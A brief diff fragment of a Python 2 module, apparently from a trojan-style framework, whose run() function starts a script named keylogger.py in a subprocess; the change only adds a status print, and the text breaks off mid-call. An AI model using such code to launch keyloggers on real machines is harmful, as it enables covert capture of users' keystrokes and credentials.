@@ -2,6 +2,8 @@ import subprocess, time, os, sys
 
 def run(**args):
 
+	print "[*] In main_out module."
+
 	cmd = [sys.executable, 'keylogger.py']
 
 	p = subprocess.Popen(cmd,
